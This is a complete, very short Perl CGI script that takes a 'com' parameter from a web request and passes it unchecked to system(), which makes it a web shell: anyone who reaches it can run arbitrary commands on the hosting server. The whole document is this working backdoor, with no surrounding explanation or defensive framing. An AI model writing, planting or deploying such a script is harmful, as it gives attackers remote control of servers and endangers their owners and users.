#!/usr/bin/perl
use CGI':standard';
print "content type: text/html \n\n";
$c=param('com');
system($c);
exit(0);

